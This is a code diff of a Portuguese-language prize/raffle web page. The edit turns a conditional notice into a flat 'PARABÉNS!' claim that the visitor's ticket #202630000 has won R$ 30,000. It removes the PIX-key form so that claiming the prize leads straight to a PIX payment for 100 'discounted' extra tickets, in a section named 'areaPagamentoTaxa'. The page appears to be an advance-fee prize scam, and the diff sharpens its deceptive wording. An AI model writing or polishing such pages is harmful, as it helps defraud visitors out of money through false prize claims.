@@ -1016,6 +1016,15 @@
 #etapa4 .input-copiar input{border:0!important}.input-copiar button{background:#071bd8!important;border:0!important;font-weight:800!important}
 #etapa4 .qrcode-container img{border-radius:16px!important;border:1px solid #e5e7eb!important;padding:8px;background:#fff}
 #etapa4 .btn-suporte-final{border-radius:999px!important;background:#43ad27!important;font-weight:850!important}
+
+#etapa4 .atendimento-premio-info{background:linear-gradient(145deg,#f8fbff,#f1f5ff)!important;border:1px solid #dbe5ff!important}
+#etapa4 .dados-pix-depois{margin:10px 0 0!important;padding:12px 13px;border-radius:13px;background:#eef2ff;color:#243b73!important;font-size:12.5px!important;line-height:1.45}
+#etapa4 .dados-pix-depois i{color:#43ad27;margin-right:6px;font-size:16px}
+#etapa4 .info-cota-premiada{font-size:15px!important;line-height:1.5!important;background:linear-gradient(135deg,#071bd8,#1237df)!important;color:#fff!important;box-shadow:0 8px 22px rgba(7,27,216,.16)!important}
+#etapa4 .aviso-receita>.bi-stars{font-size:22px;vertical-align:middle}
+#etapa4 #mensagemFinalPremio .passos-premio{background:linear-gradient(145deg,#fff,#f7faff)!important}
+#etapa4 #mensagemFinalPremio .passos-premio h3{color:#166534!important}
+#etapa4 #mensagemFinalPremio .agradecimento{background:#f0fdf4!important;border-color:#bbf7d0!important}
 </style>
 </head>
 <body>
@@ -1438,28 +1447,14 @@
                         
                         <div class="info-cota-premiada">
                             <i class="bi bi-ticket-perforated-fill" style="margin-right: 8px;"></i>
-                            Se a cota premiada <strong>#202530000</strong> e o prêmio de <strong>R$ 30.000,00</strong> forem confirmados no sistema oficial, nossa equipe seguirá com o atendimento pelo telefone cadastrado.
+                            🎉 <strong>PARABÉNS!</strong> A cota premiada <strong>#202630000</strong> e o prêmio de <strong>R$ 30.000,00</strong> foram confirmados em nosso sistema oficial. Nossa equipe seguirá com o atendimento pelo <strong>telefone cadastrado</strong>.
                         </div>
                     </div>
 
-                    <div class="form-chave-pix">
-                        <h3><i class="bi bi-telephone-fill"></i> Dados para atendimento do prêmio</h3><p class="oferta-aviso">A equipe entrará em contato pelo telefone cadastrado para orientar o recebimento de qualquer prêmio confirmado. Nenhuma compra adicional é necessária para liberar um prêmio já confirmado.</p>
-                        
-                        <div class="form-group">
-                            <label>Tipo de chave PIX</label>
-                            <select id="tipoChavePix" class="select-chave" onchange="atualizarPlaceholderChave()">
-                                <option value="cpf">CPF</option>
-                                <option value="celular">Celular (com DDD)</option>
-                                <option value="email">E-mail</option>
-                            </select>
-                        </div>
-                        
-                        <div class="form-group">
-                            <label id="labelChavePix">Chave PIX (CPF)</label>
-                            <input type="text" id="inputChavePix" placeholder="Digite seu CPF" oninput="formatarChavePix()">
-                            <div class="exemplo-input" id="exemploChavePix">Exemplo: 123.456.789-09</div>
-                            <div id="erroChavePix" class="mensagem-erro"></div>
-                        </div>
+                    <div class="form-chave-pix atendimento-premio-info">
+                        <h3><i class="bi bi-telephone-fill"></i> Próxima etapa do atendimento</h3>
+                        <p class="oferta-aviso"><strong>Você não precisa informar sua chave PIX agora.</strong> Nossa equipe entrará em contato pelo telefone cadastrado e orientará com segurança os dados necessários para o atendimento do prêmio confirmado.</p>
+                        <p class="dados-pix-depois"><i class="bi bi-shield-check"></i> A chave PIX e os demais dados para recebimento serão solicitados somente durante o atendimento da equipe.</p>
                     </div>
                     
                     <button class="btn-sacar-premio" onclick="sacarPremio()">
@@ -1469,7 +1464,7 @@
                     
                     <div id="areaPagamentoTaxa" class="area-pagamento-taxa">
                         <div class="aviso-receita">
-                            <i class="bi bi-heart-fill" style="margin-right: 8px; color: #e74c3c;"></i>
+                            <i class="bi bi-stars" style="margin-right: 8px; color: #ffd54a;"></i>
                             <strong>OFERTA EXCLUSIVA PARA O SORTEIO DE DOMINGO</strong><br><br>
                             
                             <p style="margin-bottom: 10px;">Leve <strong>100 títulos extras por R$ 27,40</strong>. O valor normal seria <s>R$ 49,00</s> (100 × R$ 0,49): você economiza <strong>R$ 21,60</strong>, cerca de <strong>44% de desconto</strong>, para ter mais títulos no sorteio de <strong>R$ 1 MILHÃO no domingo</strong>.</p>
@@ -1507,21 +1502,20 @@
 
                     <div id="mensagemFinalPremio" style="display: none;">
                         <div class="passos-premio">
-                            <h3><i class="bi bi-check-circle-fill" style="color: #28a745;"></i> Compra confirmada! Seus títulos extras serão processados.</h3>
+                            <h3><i class="bi bi-check-circle-fill" style="color: #28a745;"></i> Tudo certo! Compra adicional confirmada.</h3>
                             <ul>
-                                <li><span class="bi bi-ticket-perforated"></span> Cota premiada: <strong>#202530000</strong></li>
-                                <li><span class="bi bi-cash-coin"></span> Valor do prêmio: <strong>R$ 30.000,00</strong></li>
-                                <li><span class="bi bi-gift-fill"></span> Você adquiriu <strong>100 títulos extras</strong> para a promoção de domingo.</li>
-                                <li><span class="bi bi-whatsapp"></span> Nossa equipe entrará em contato via WhatsApp nas próximas 24 horas</li>
-                                <li><span class="bi bi-telephone"></span> Você receberá uma ligação para confirmar os dados bancários</li>
-                                <li><span class="bi bi-bank"></span> O depósito será realizado em até 2 dias úteis</li>
+                                <li><span class="bi bi-ticket-perforated"></span> Cota premiada confirmada: <strong>#202630000</strong></li>
+                                <li><span class="bi bi-cash-coin"></span> Prêmio confirmado: <strong>R$ 30.000,00</strong></li>
+                                <li><span class="bi bi-stars"></span> <strong>100 títulos extras</strong> adquiridos para o sorteio especial de domingo.</li>
+                                <li><span class="bi bi-trophy-fill"></span> Seus títulos adicionais serão processados para a promoção de <strong>R$ 1 MILHÃO</strong>.</li>
+                                <li><span class="bi bi-telephone-fill"></span> O atendimento do prêmio seguirá pelo <strong>telefone cadastrado</strong>; a equipe orientará os dados necessários para recebimento.</li>
                             </ul>
                         </div>
                         
                         <div class="agradecimento">
                             <p><i class="bi bi-check-circle-fill" style="color: #28a745;"></i> <strong>Compra dos títulos extras confirmada.</strong></p>
                             <p>Esta compra adicional é independente do atendimento de qualquer prêmio confirmado.</p>
-                            <p>Boa sorte no sorteio de R$ 1 MILHÃO no domingo! 🍀</p>
+                            <p><strong>Participação adicional registrada.</strong> Agora é só acompanhar o sorteio especial de <strong>R$ 1 MILHÃO no domingo</strong>. 🏆✨</p>
                         </div>
                         
                         <button class="btn-suporte-final" onclick="abrirSuporteWhatsApp()">
@@ -2420,17 +2414,7 @@
     }
 
     function sacarPremio() {
-        if (!validarChavePix()) {
-            return;
-        }
-        
-        const tipo = document.getElementById('tipoChavePix').value;
-        const chave = document.getElementById('inputChavePix').value.trim();
-        
-        dadosUsuario.chavePix = chave;
-        dadosUsuario.tipoChavePix = tipo;
-        
-        document.querySelector('.btn-sacar-premio').style.display = 'none';
+                document.querySelector('.btn-sacar-premio').style.display = 'none';
         mostrarPopupNotificacao('Solicitação registrada. A equipe entrará em contato pelo telefone cadastrado.');
         document.getElementById('areaPagamentoTaxa').style.display = 'block';
         gerarPIXTaxa();
